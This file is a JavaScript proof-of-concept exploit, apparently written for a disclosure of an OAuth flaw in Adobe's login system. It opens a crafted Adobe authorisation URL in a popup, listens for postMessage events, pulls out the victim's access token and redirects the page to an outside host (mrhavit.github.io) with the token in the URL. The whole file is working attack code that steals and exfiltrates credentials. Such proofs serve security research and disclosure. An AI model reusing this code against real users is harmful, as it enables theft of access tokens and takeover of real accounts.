// poc.js

let childWindow;

document.body.style.height = "100vh";
document.body.style.display = "flex";
document.body.style.justifyContent = "center";
document.body.style.alignItems = "center";

const heading = document.createElement("h2");
heading.textContent = "Click anywhere to trigger";
document.body.appendChild(heading);

document.addEventListener('click', () => {
    const urlToOpen = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2Fclio-playground-web%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Fauth-light.identity.adobe.com%252Fwrapper-popup-helper%252Findex.html%26state%3D%257B%2522namedsadsadsa1%2522%253A%2522AccessTokenFlow%2522%252C%2522side%2522%253A%2522popup%2522%252C%2522data%2522%253A%257B%2522access_token%2522%253A%2522%2522%257D%257D%26code_challenge_method%3Dplain%26use_ms_for_expiry%3Dfalse&client_id=clio-playground-web&scope=AdobeID%2Cfirefly_api%2Copenid%2Cpps.read%2Cadditional_info.projectedProductContext%2Cadditional_info.ownerOrg%2Cuds_read%2Cuds_write%2Cab.manage%2Cread_organizations%2Cadditional_info.roles%2Caccount_cluster.read&state=%7B%22name%22%3A%22AccessTokenFlow%22%2C%22side%22%3A%22popup%22%2C%22data%22%3A%7B%22access_token%22%3A%22%22%2C%22client_id%22%3A%22ProjectCentralPanel11%22%2C%22returnOrigin%22%3A%22https%3A%2F%2Fcclibrariespanel-cdn.adobe.com%22%2C%22relay%22%3A%22your-relay-value%22%7D%7D&relay=ca48c374-ae25-4d2a-963f-4d6a99d1c538&locale=en_US&flow_type=token&idp_flow_type=login&s_p=google%2Cfacebook%2Capple%2Cmicrosoft%2Cline%2Ckakao&response_type=token&code_challenge_method=plain&redirect_uri=https%3A%2F%2Fauth-light.identity.adobe.com%2Fwrapper-popup-helper%2Findex.html&use_ms_for_expiry=false";
    
    childWindow = window.open(urlToOpen, "_blank");
}, { once: true });

window.addEventListener('message', (event) => {
    try {
        const outerData = typeof event.data === 'string' ? JSON.parse(event.data) : event.data;

        if (outerData && outerData.name === 'query-state' && outerData.data) {
            // First decode
            const innerDataRaw = typeof outerData.data === 'string' ? JSON.parse(outerData.data) : outerData.data;

            // Check for access token
            if (
                innerDataRaw.name === 'AccessTokenFlow' &&
                innerDataRaw.data &&
                innerDataRaw.data.access_token
            ) {
                const accessToken = innerDataRaw.data.access_token;
                location = `https://mrhavit.github.io/?token=${accessToken}`
                // document.write(`Received access token: ${accessToken}`);
            } else {
                console.log('No access_token found in innerDataRaw:', innerDataRaw);
            }
        } else {
            console.log('Unexpected message structure:', outerData);
        }
    } catch (error) {
        console.error('Error parsing message:', error, event.data);
    }
});